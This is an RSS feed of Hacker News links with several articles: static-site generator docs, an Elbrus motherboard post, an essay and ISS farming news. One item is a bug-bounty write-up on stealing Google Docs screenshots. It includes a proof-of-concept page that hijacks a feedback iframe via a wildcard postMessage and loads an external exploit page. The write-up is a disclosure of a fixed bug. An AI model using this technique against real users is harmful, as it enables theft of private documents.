      <p>To build the site, run:</p>
      <pre><code>$ obelix build
</code></pre>
      <p>This will parse through all file in the source directory, transform them as necessary, and render the final site to the output directory (creating it if necessary). Any markdown files will get transformed to HTML, frontmatter and Handlebars template expressions will be processed, and layout and list templates will be applied.</p>
      <p>You can also run:</p>
      <pre><code>$ obelix serve
</code></pre>
      <p>This will start a web server serving your site on port 8080 (by default - pass the <code>-p</code> option to change this). The server will automatically rebuild the site whenever it detects changes to a source file. This is a just a development convenience - the <code>obelix serve</code> server is not production-ready!</p>
      <p>There are a few other keys you can put in <code>obelix.json</code>:</p>
      <ul>
        <li><code>"metadata"</code>: this should be a JSON object containing site metadata. This object will exposed in Handlebars templates as the <code>site</code> key (see below)</li>
        <li><code>"plugins"</code>: An object mapping plugin names to configuration options. More details on this in the Plugins section below</li>
      </ul>
      <h2>Source file configuration</h2>
      <p>All source files in an Obelix site are considered either an <code>asset</code> or a <code>page</code>. A <code>page</code> is a text file (with any file extension) where the beginning of the file contains <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter. YAML frontmatter is used to specify metadata about the page and consists of the characters <code>---</code>, followed by a newline and a YAML document containing data you want, and finally another newline and the closing characters <code>---</code>. For example:</p>
      <pre><code>---
author: Getafix
title: Little-known herbs of Gaul
published: 2020-12-17
tags:
  - blog
  - druidism
---
And then the page content goes here!
</code></pre>
      <p>Obelix performs some default transformations on <code>page</code>-type sources, including expanding Handlebars template expressions and applying layout templates, and exposes these files as data in list templates (more on all this later).</p>
      <p>Any file that does not contain YAML frontmatter, including image or other non-text files, are considered <code>asset</code>-type sources. Obelix does no additional processing on <code>asset</code> files - it just copies them verbatim to the output directory.</p>
      <p><strong>Important</strong>: Even if you have no metadata you want to attach to a page, you need to put YAML frontmatter on it for Obelix to process it. In these cases, you can just put the opening <code>---</code> and closing <code>---</code> with no content in between.</p>
      <p>The source directory structure determines the output directory structure. For example, a source file <code>blob/post1.md</code> would get written to the output directory as <code>blog/post1.html</code>.</p>
      <h2>Template expansion</h2>
      <p><code>Page</code>-type source files can contain <a href="https://handlebarsjs.com/">Handlebars</a> template expressions. Template expressions are delimited by double curly braces - for example, <code>{{ title }}</code>. Any page metadata in the page's frontmatter is available as a variable for use in a template expression, and any site metadata set in <code>obelix.json</code> is available in the <code>site</code> object in template expressions.</p>
      <p>For example, given the following <code>obelix.json</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build",
    "metadata": {
        "publisher": "When In Rome LLC"
    }
}
</code></pre>
      <p>And the following <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
author: Caesar
---
This post was written by {{ author }} and published by {{ site.publisher }}
</code></pre>
      <p>The output file <code>post.html</code> would render like this:</p>
      <pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;This post was written by Caesar and published by When In Rome LLC&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Handlebars offers many additional templating features - see <a href="https://handlebarsjs.com/guide/">the official guide</a> to learn more.</p>
      <h2>Layout templates</h2>
      <p>Layout templates allow you to apply a unified layout to <code>page</code> sources. By default, layout templates are any file named <code>layout.html.hbs</code> or <code>layout.html.handlebars</code>, but these defaults can be overridden by the <code>"layoutTemplates"</code> <code>obelix.json</code> field, which should be an array of layout template names. Individual pages can also specify a <code>template</code> metadata field, which should be the name of the file to use as a layout template for that page. Layout templates apply to all <code>page</code> sources in the same directory they are in and in subdirectories, but if a subdirectory has its own layout template that template overrides the parent layout template. This means you can put a <code>layout.html.hbs</code> at the root of your site that will be applied by default to every <code>page</code> in the site, but you can override that template for individual subdirectories by giving them their own <code>layout.html.hbs</code>.</p>
      <p>A layout template is a Handlebars template that gets passed the content of the page it is applied to as the <code>content</code> key. When rendering a <code>page</code>, if Obelix finds a layout template for that page it will render the layout template and replace the output content with the result.</p>
      <p>An example should make things clearer. Given this <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
---
# My Post
This is some hot content!
</code></pre>
      <p>And this <code>layout.html.hbs</code>:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
       {{{ content }}}
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>The output file <code>post.html</code> would look like this:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
      &lt;h1&gt;My Post&lt;/h1&gt;
      &lt;p&gt;This is some hot content!&lt;/p&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Note the use of triple curly braces in <code>{{{ content }}}</code>. This tells Handlebars not to HTML-escape the result of the expression. See <a href="https://handlebarsjs.com/guide/#html-escaping">here</a> for more info.</p>
      <h2>List templates</h2>
      <p>A list template is like a layout template, but instead of being passed a single page it gets passed a list of pages. List templates can be used to generate index pages, RSS feeds, or any other collection of content. A list template is simply any file with a <code>.hbs</code> or <code>.handlebars</code> file extension that isn't a layout template. Unless you have the <code>"layoutTemplates"</code> configuration option set, this means that any <code>.hbs</code> or <code>.handlebars</code> file that isn't named <code>layout.html.hbs</code>, <code>layout.html.handlebars</code>, or is the target of a <code>template</code> page metadata will be treated as a list template.</p>
      <p>List templates get passed an array of all pages in the same directory as them as the <code>pages</code> variable. Each item in this list is a <code>page</code> object that the one that gets passed to layout templates - it will have a <code>content</code> key containing the page content in addition to any keys in the page frontmatter. The <code>pages</code> array can be iterated over using the <a href="https://handlebarsjs.com/guide/builtin-helpers.html#each">Handlebars <code>each</code> helper</a>:</p>
      <pre><code>&lt;html&gt;
    &lt;body&gt;
      {{#each pages}}
          &lt;h1&gt;{{ title }}&lt;/h1&gt;
          
      {{/each}}
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>If you want to iterate over pages that aren't in the same directory as the list template, you can use the <code>site.pages</code> variable. This variable is a nested array of all pages in the site. The format of <code>site.pages</code> is a little weird: it's a recursive array that can be iterated over to access the pages in the top-level directories, but exposes subdirectories as attributes on that array with values that are themselves recursive arrays. For example, given the following site structure:</p>
      <pre><code>.
├── index.md
├── about.md
└── blog
    ├── post1.md
    └── post2.md
</code></pre>
      <p>The <code>site.pages</code> variable would be an array containing <code>index.md</code> and <code>about.md</code>, and <code>site.pages.blog</code> would be an array containing <code>post1.md</code> and <code>post2.md</code>.</p>
      <p>If you have a directory whose name isn't a valid JavaScript identifier, you can access it using index notation, e.g. <code>site.pages["My weird folder"]</code>. Although this layout is a bit unconventional, it makes it convenient to loop through pages using the <code>{{each}}</code> helper at any level in the directory structure.</p>
      <p>List templates can be either <code>page</code> or <code>asset</code> sources. If you include a frontmatter block in a list template, it will be treated as a <code>page</code> and have layout templates applied to it. If not, it will be treated as an <code>asset</code> and layout templates will not be applied to it.</p>
      <p>Tip: Obelix adds a <code>url</code> metadata field to every page by default. This is especially useful in list templates as it lets you construct a link to the pages that the list template is rendering.</p>
      <h2>Data files</h2>
      <p>Source files with a <code>.json</code>, <code>.yaml</code>, or <code>.yml</code> extension are considered data files. Data files are a way to store structured data that isn't meant to be displayed literally. Obelix parses all the data files it finds and passes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://obelix-site-builder.github.io/obelix/">https://obelix-site-builder.github.io/obelix/</a></em></p>]]>
            </description>
            <link>https://obelix-site-builder.github.io/obelix/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559551</guid>
            <pubDate>Mon, 28 Dec 2020 14:48:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: FixScript – the annoying part of ops, automated]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559301">thread link</a>) | @WFHRenaissance
<br/>
December 28, 2020 | https://www.fixscript.net/get_to_the_point | <a href="https://web.archive.org/web/*/https://www.fixscript.net/get_to_the_point">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.fixscript.net/get_to_the_point</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559301</guid>
            <pubDate>Mon, 28 Dec 2020 14:16:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ITX Motherboard with an Elbrus CPU]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 91 (<a href="https://news.ycombinator.com/item?id=25559240">thread link</a>) | @jamesmd
<br/>
December 28, 2020 | https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3135">

	

	<div>
		
<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>



<figure><img src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Elbrus-4C Based PC</figcaption></figure>



<h2>IcepeakITX ELBRUS-8CB Motherboard</h2>



<div><p>The IcepeakITX ELBRUS-8CB Motherboard is the brain child of a group of enthusiasts that banded together to crowdfund a security focused Mini ITX motherboard featuring a 1.5GHZ 8 core Elbrus 8CB CPU and ships with either 8GB or 32GB DDR4 ECC RAM. The board does not ship with a heatsink however it is compatible with any heatsink designed for the Intel LGA3647 socket. </p></div>



<figure><img src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>IcepeakITX ELBRUS-8CB Motherboard</figcaption></figure>



<h2>Full Technical Specifications</h2>



<ul><li><strong>Form-factor:</strong>&nbsp;Mini-ITX</li><li><strong>CPU:</strong>&nbsp;MCST (Moscow Center of SPARC Technologies) Elbrus-8CB 8-core @ 1.5 GHz VLIW (fully compatible with any LGA3647 heatsink)</li><li><strong>SB:</strong>&nbsp;MCST KPI-2 Multicontroller</li><li><strong>RAM:</strong>&nbsp;8 GB or 32 GB (2x [4+1] 8 Gbit/32 Gbit DDR4 DRAM 2400 MHz ECC)</li><li><strong>SATA:</strong>&nbsp;2x M.2_2280 + 4x SATA_6G</li><li><strong>Storage Expansion:</strong>&nbsp;1x microSD (HC)</li><li><strong>Cache:</strong>&nbsp;1x PATA 8 GB (required as cache device for hardware emulation of x86 on Elbrus)</li><li><strong>PCIe:</strong>&nbsp;1x PCIe2_x16 + 1x PCIe2_x1 (as USB3)</li><li><strong>Security:</strong><ul><li>1x TPM SPI connector</li><li>2x boot firmware chip with extra security</li><li>3x heatsink detectors</li><li>1x temperature sensor trigger</li><li>2x tampering sensor</li></ul></li><li><strong>Network:</strong><ul><li>Marvell M88E1111-RCJ chipset</li><li>1x 1G_SFP</li><li>3x 1G_RJ45</li></ul></li><li><strong>GPS:</strong>&nbsp;GPS chip with internal antenna port</li><li><strong>USB:</strong><ul><li>2x USB 2.0 (rear)</li><li>4x USB 2.0 (+PD) (rear)</li><li>2x USB 3.0 (rear)</li><li>1x USB 2.0 (internal)</li></ul></li><li><strong>COM:</strong>&nbsp;1x COM header (internal) required for debugging boot</li><li><strong>Debug:</strong>&nbsp;1x 6-pin debug port, 1x 4-pin (USB to GPIO)</li><li><strong>Video:</strong>&nbsp;2x HDMI (1 HDMI per SM768/256 MB)</li><li><strong>Audio:</strong>&nbsp;Integrated simple audio codec (Linux-compatible)</li><li><strong>Additional Sensors:</strong><ul><li>Fall detection sensor</li><li>Gyroscope</li><li>Water sensor</li></ul></li><li><strong>Additional Connectors:</strong><ul><li>2x PWM-4</li><li>RTC battery connector</li><li>Simple BEEP connector</li></ul></li><li><strong>PCB:</strong>&nbsp;14 layers (level 5 accuracy) / ISOLA Hi Tg 180</li></ul>



<div><p>The Motherboard is also fully opensource and after funding the board schematics and design specifications will be released on github. </p><p>Crowdfunding for the IcepeakITX ELBRUS-8CB is expected to go live early next year via crowdsupply. More details can be found <a href="https://www.crowdsupply.com/sra-centr8/icepeakitx-elbrus-8cb" target="_blank" rel="noreferrer noopener">here</a>. </p><p>Check out more interesting tech coming to crowdfunding sites <a href="https://blog.jmdawson.co.uk/category/crowdfunding/">here</a>.</p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559240</guid>
            <pubDate>Mon, 28 Dec 2020 14:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing private documents through a bug in Google Docs]]>
            </title>
            <description>
<![CDATA[
Score 310 | Comments 138 (<a href="https://news.ycombinator.com/item?id=25559063">thread link</a>) | @hackerpain
<br/>
December 28, 2020 | https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/ | <a href="https://web.archive.org/web/*/https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://savebreach.com/content/images/size/w300/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 300w,
                            https://savebreach.com/content/images/size/w600/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 600w,
                            https://savebreach.com/content/images/size/w1000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 1000w,
                            https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png" alt="Stealing your private documents through a bug in Google Docs">
            </figure>

            <section>
                <div>
                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559063</guid>
            <pubDate>Mon, 28 Dec 2020 13:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Against Company Values]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558934">thread link</a>) | @lftherios
<br/>
December 28, 2020 | http://eleftherios.io/against-company-values/ | <a href="https://web.archive.org/web/*/http://eleftherios.io/against-company-values/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
    <p><strong>April, 2020</strong></p>
<p>Technology companies love to talk about their values. Unfortunately, values are highly abstract and ambivalent constructs that mean different things to different people.</p>
<p>In my opinion, the reason why certain companies (or the leadership teams) love values so much is due to a fundamental lack of inspiring visions. When your company's purpose is to make people click on useless ads, you've got to come up with something else to inspire your employees. Luckily, humans are built with descent bullshit detectors and in practice this form of corporate jargon rarely works as a motivator.</p>
<p>Recognizing the above, I believe that organizations that have a meaningful reason to exist (ie something people can stand behind) should start the other way around. They should define their purpose, spend quality time describing and documenting the world they adhere to, and then reverse engineer from that.</p>
<p>An organization that strives to be <em>fully aligned</em> with its purpose, <em>highly aligned</em> with its day to day practices and <em>loosely aligned</em> in terms of beliefs and principles is more likely to create an inspiring environment for existing and potential employees.</p>

</div></div>]]>
            </description>
            <link>http://eleftherios.io/against-company-values/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558934</guid>
            <pubDate>Mon, 28 Dec 2020 13:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Recurring reviews to track the whole lifecycle of a product]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25558891">thread link</a>) | @hubraumhugo
<br/>
December 28, 2020 | https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558891</guid>
            <pubDate>Mon, 28 Dec 2020 13:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Images of the the samples returned to earth from the asteroid Ryugu]]>
            </title>
            <description>
<![CDATA[
Score 507 | Comments 129 (<a href="https://news.ycombinator.com/item?id=25558874">thread link</a>) | @naetius
<br/>
December 28, 2020 | http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/ | <a href="https://web.archive.org/web/*/http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558874</guid>
            <pubDate>Mon, 28 Dec 2020 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microfarm on the International Space Station Grows Radishes in One Month]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558865">thread link</a>) | @bookofjoe
<br/>
December 28, 2020 | https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/ | <a href="https://web.archive.org/web/*/https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>The thought of eating "astronaut food" brings to mind a kind of instant food that is far from "farm to table." However, recent experiments aboard the ISS are improving our understanding of how to bring the farm directly into space itself.</p><p>Astronauts just ran a Veg-PONDS 02 experiment on the International Space Station. The experiment used food that was cultivated in space. Potential cultivations could include tomatoes or other plants, NASA says.</p><p>On November 30th, Kate Rubins took about 6 packs of radishes from the lab and stored them in a refrigerated unit after gathering them up—freshly grown in space. The process opens new doors for microgravity food processing to enable future long-term moon and Mars missions. The radish sprouts will be sent back to Earth early next year on SpaceX's 22nd Commercial Resupply Services mission, NASA announced.</p><figure><img src="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Rzodkiewka " srcset="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jo_lanta?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jo Lanta</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Radishes, a well-known fresh vegetable, were chosen for the Plant Habitat-02 experiment because vegetables are well understood by scientists. Radishes are perfectly useful for in-orbit space research. They are edible, nutritious and similar to Arabidopsis, a small flowering plant that has been studied by NASA repeatedly.</p><p>A new method lets astronauts cultivate romaine lettuce seeds in 12 passive orbital nutrient delivery systems. The units are less expensive than the seed bags and can hold more water, NASA says. Six of the 12 PONDS units will be returned to Earth on a future SpaceX mission for further analysis. More nutrition will be required for space explorers on their way to Mars.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/UT0K3GmNV7E?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; 